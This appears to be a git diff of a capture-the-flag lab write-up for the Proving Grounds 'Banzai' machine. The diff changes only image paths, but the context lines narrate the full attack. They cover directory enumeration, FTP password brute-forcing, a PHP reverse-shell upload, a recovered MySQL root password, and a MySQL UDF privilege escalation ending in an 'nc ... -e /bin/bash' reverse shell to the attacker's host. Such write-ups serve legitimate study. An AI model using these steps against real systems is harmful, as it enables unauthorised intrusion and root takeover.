@@ -107,9 +107,9 @@ Enumerated top 200 UDP ports:
 
 #### Typed "sudo gobuster dir -u http://192.168.189.56:8295 -w /usr/share/dirb/wordlists/common.txt -e -k -t50 -x "txt,html,php,asp,aspx,jsp" -o "/home/kali/Downloads/ProvingGroundsBoxes/Banzai/tcp_8295_http_common.txt" and found the following directory's I have access to:
 
-![](Pasted%20image%2020220930213106.png)
+![](Images/Pasted%20image%2020220930213106.png)
 
-![](Pasted%20image%2020221001093953.png)
+![](Images/Pasted%20image%2020221001093953.png)
 
 ## Port 21
 
@@ -117,14 +117,14 @@ Enumerated top 200 UDP ports:
 
 #### Navigated to "/usr/share/seclists/Passwords/ftp-betterdefaultpasslist.txt" and cat'd the file and placed the usernames:passwords into a file named "ftp_common_passwords.txt"
 
-![](Pasted%20image%2020221001094042.png)
-![](Pasted%20image%2020221001094414.png)
-![](Pasted%20image%2020221001094507.png)
+![](Images/Pasted%20image%2020221001094042.png)
+![](Images/Pasted%20image%2020221001094414.png)
+![](Images/Pasted%20image%2020221001094507.png)
 
 #### Typed "hydra -f -C ftp_common_passwords.txt 192.168.177.56 ftp" which "-C" flag allows inputting a username and password with the following combo list:
 "username:password" and found ftp server username is "admin" and password is "admin"
 
-![](Pasted%20image%2020221001094549.png)
+![](Images/Pasted%20image%2020221001094549.png)
 
 ---
 
@@ -133,11 +133,11 @@ Enumerated top 200 UDP ports:
 
 #### Logged into ftp server with username "admin" and password "admin" and found directory "/js" found accessible in the gobuster scan above:
 
-![](Pasted%20image%2020221001094625.png)
+![](Images/Pasted%20image%2020221001094625.png)
 
 #### Typed "lcd" in ftp server and found I was in local directory "/home/kali":
 
-![](Pasted%20image%2020221001094655.png)
+![](Images/Pasted%20image%2020221001094655.png)
 
 #### Created php pentest reverse shell script in vim file named "reverse_shell.php" on my kali machine in the "/home/kali"directory
 
@@ -145,12 +145,12 @@ Enumerated top 200 UDP ports:
 
 #### Typed "mput reverse_shell.php" to upload the reverse shell into the ftp server on directory "/js":
 
-![](Pasted%20image%2020221001095230.png)
+![](Images/Pasted%20image%2020221001095230.png)
 
 #### Navigated to http://192.168.143.56:8295/js/ and found the reverse shell uploaded on the page and clicked the link and received a reverse shell on penelope listener:
 
-![](Pasted%20image%2020221001095356.png)
-![](Pasted%20image%2020221001095428.png)
+![](Images/Pasted%20image%2020221001095356.png)
+![](Images/Pasted%20image%2020221001095428.png)
 
 
 ---
@@ -161,17 +161,17 @@ Enumerated top 200 UDP ports:
 
 #### Navigated to directory "/var/www" and found "config.php" file and cat'd the file and found user "root" and password "EscalateRaftHubris123":
 
-![](Pasted%20image%2020221001095458.png)
+![](Images/Pasted%20image%2020221001095458.png)
 
 #### Typed "netsat –tulpn" and found port "3306" (mysql) listening on localhost:
 
-![](Pasted%20image%2020221001095532.png)
+![](Images/Pasted%20image%2020221001095532.png)
 
 ## Port 3306
 
 #### Typed "mysql –u root –p" and logged in with the found password for mysql "EscalateRaftHubris123":
 
-![](Pasted%20image%2020221001095708.png)
+![](Images/Pasted%20image%2020221001095708.png)
 
 
 
@@ -180,12 +180,12 @@ Enumerated top 200 UDP ports:
 
 #### Googled "mysql root privilege escalation" as I was able to login with root in Mysql and found the following webpage listing the steps to escalate privileges:
 
-![](Pasted%20image%2020221001095752.png)
-![](Pasted%20image%2020221001095822.png)
-![](Pasted%20image%2020221001095848.png)
-![](Pasted%20image%2020221001095931.png)
-![](Pasted%20image%2020221001100004.png)
-![](Pasted%20image%2020221001100029.png)
+![](Images/Pasted%20image%2020221001095752.png)
+![](Images/Pasted%20image%2020221001095822.png)
+![](Images/Pasted%20image%2020221001095848.png)
+![](Images/Pasted%20image%2020221001095931.png)
+![](Images/Pasted%20image%2020221001100004.png)
+![](Images/Pasted%20image%2020221001100029.png)
 
 #### Typed "searchsploit -m linux/local/1518.c" to place exploit on my kali machine
 
@@ -199,11 +199,11 @@ Enumerated top 200 UDP ports:
 
 #### Typed "mysql –u root –p" and logged in with the found password for mysql "EscalateRaftHubris123" to login into mysql:
 
-![](Pasted%20image%2020221001100055.png)
+![](Images/Pasted%20image%2020221001100055.png)
 
 #### Typed "show variables like '%plugin%';" to show the current plugin directory in the database
 
-![](Pasted%20image%2020221001100121.png)
+![](Images/Pasted%20image%2020221001100121.png)
 
 #### Typed "use mysql;"
 
@@ -217,13 +217,13 @@ Enumerated top 200 UDP ports:
 
 #### Typed "select * from mysql.func;" to conirm the "raptor_udf2.so" shared object file got placed in the do_system function table:
 
-![](Pasted%20image%2020221001100150.png)
+![](Images/Pasted%20image%2020221001100150.png)
 
 #### Started a netcat listner on my kali machine listening on port 8295
 
 #### Typed "select do_system('nc 192.168.49.101 8295 -e /bin/bash');" in mysql database on target machine and received a root shell:
 
-![](Pasted%20image%2020221001100235.png)
+![](Images/Pasted%20image%2020221001100235.png)
 
 
 ---
